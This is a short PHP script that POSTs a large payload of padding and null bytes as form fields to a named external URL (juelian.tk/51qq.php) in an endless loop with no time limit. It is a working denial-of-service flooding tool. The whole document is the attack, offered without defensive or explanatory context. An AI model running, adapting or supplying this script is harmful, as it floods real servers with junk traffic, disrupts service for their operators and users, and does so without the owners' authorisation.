<?php
set_time_limit(0);
$x='Lok\'tar ogar!';
for($i=65536;$i>0;$i--)$x.="\x00\x01\x00";
do{
$h=new httplib;
$h->open('http://juelian.tk/51qq.php');
$h->post('name',$x);
$h->post('age',$x);
$h->send();
$h->response();
}while(true);